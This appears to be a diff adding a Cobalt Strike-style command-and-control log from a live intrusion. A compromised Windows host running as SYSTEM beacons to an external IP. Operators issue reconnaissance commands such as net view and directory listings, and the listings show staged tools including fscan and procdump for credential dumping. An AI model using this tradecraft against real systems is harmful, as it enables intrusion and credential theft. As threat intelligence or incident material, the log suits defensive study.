@@ -1,0 +1,97 @@
+01/11 13:28:38 UTC [metadata] 120.26.203.57 <- 10.11.0.16; computer: iZygn0ix8iaheaZ; user: SYSTEM *; process: rundll32.exe; pid: 14680; os: Windows; version: 10.0; build: 14393; beacon arch: x64 (x64)
+01/11 13:28:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:28:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:28:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:28:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:28:33 UTC [task] <T1029> Tasked beacon to become interactive
+01/11 13:28:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:28:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:28:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:28:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:28:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:28:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:29:38 UTC [metadata] 120.26.203.57 <- 10.11.0.16; computer: iZygn0ix8iaheaZ; user: SYSTEM *; process: rundll32.exe; pid: 14680; os: Windows; version: 10.0; build: 14393; beacon arch: x64 (x64)
+01/11 13:29:32 UTC [checkin] host called home, sent: 96 bytes
+01/11 13:29:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:29:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:29:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:29:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:29:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:29:33 UTC [task] <T1029> Tasked beacon to become interactive
+01/11 13:29:33 UTC [task] <T1029> Tasked beacon to sleep for 30s (30% jitter)
+01/11 13:29:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:29:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:29:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:29:33 UTC [note] Bid: 730975144  NT: 10.0
+01/11 13:29:57 UTC [checkin] host called home, sent: 96 bytes
+01/11 13:30:19 UTC [input] <laotan> check in
+01/11 13:30:19 UTC [error] Unknown command: check in
+01/11 13:30:22 UTC [input] <laotan> checkin
+01/11 13:30:22 UTC [task] <> Tasked beacon to checkin
+01/11 13:30:27 UTC [checkin] host called home, sent: 8 bytes
+01/11 13:30:27 UTC [input] <laotan> sleep 0
+01/11 13:30:27 UTC [task] <T1029> Tasked beacon to become interactive
+01/11 13:30:50 UTC [checkin] host called home, sent: 16 bytes
+01/11 13:31:36 UTC [input] <laotan> net view
+01/11 13:31:36 UTC [task] <T1018, T1093> Tasked beacon to run net view
+01/11 13:31:36 UTC [checkin] host called home, sent: 105057 bytes
+01/11 13:31:38 UTC [output]
+received output:
+List of hosts:
+
+
+
+01/11 13:31:50 UTC [output]
+received output:
+ Server Name             IP Address                       Platform  Version  Type   Comment
+ -----------             ----------                       --------  -------  ----   -------
+[-] Error: 6118
+
+
+01/11 13:32:00 UTC [input] <laotan> shell ls
+01/11 13:32:00 UTC [task] <T1059> Tasked beacon to run: ls
+01/11 13:32:01 UTC [checkin] host called home, sent: 33 bytes
+01/11 13:32:01 UTC [output]
+received output:
+'ls' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+01/11 13:32:02 UTC [input] <laotan> ls
+01/11 13:32:03 UTC [task] <> Tasked beacon to list files in .
+01/11 13:32:03 UTC [checkin] host called home, sent: 19 bytes
+01/11 13:32:03 UTC [output]
+C:\Users\Public\*
+D	0	01/11/2024 20:52:28	.
+D	0	01/11/2024 20:52:28	..
+D	0	05/17/2022 15:41:26	AccountPictures
+D	0	05/18/2022 06:31:43	Desktop
+F	174	07/16/2016 21:21:29	desktop.ini
+D	0	04/19/2022 03:42:31	Documents
+D	0	07/16/2016 21:23:24	Downloads
+F	5427200	01/11/2024 20:42:03	fscan.exe
+D	0	07/16/2016 21:23:24	Libraries
+D	0	07/16/2016 21:23:24	Music
+D	0	07/16/2016 21:23:24	Pictures
+F	791960	01/11/2024 20:52:28	procdump.exe
+F	424856	01/11/2024 20:52:16	procdump64.exe
+D	0	07/16/2016 21:23:24	Videos
+
+
+01/11 13:32:26 UTC [input] <laotan> cd Desktop
+01/11 13:32:27 UTC [task] <> cd Desktop
+01/11 13:32:27 UTC [checkin] host called home, sent: 15 bytes
+01/11 13:32:28 UTC [input] <laotan> ls
+01/11 13:32:28 UTC [task] <> Tasked beacon to list files in .
+01/11 13:32:28 UTC [checkin] host called home, sent: 19 bytes
+01/11 13:32:28 UTC [output]
+C:\Users\Public\Desktop\*
+D	0	05/18/2022 06:31:43	.
+D	0	05/18/2022 06:31:43	..
+F	174	07/16/2016 21:21:29	desktop.ini
+F	2178	01/10/2024 20:02:19	Google Chrome.lnk
+
+
+01/11 13:42:00 UTC [input] <kun> sleep 0
+01/11 13:42:00 UTC [task] <T1029> Tasked beacon to become interactive
+01/11 13:42:00 UTC [checkin] host called home, sent: 16 bytes
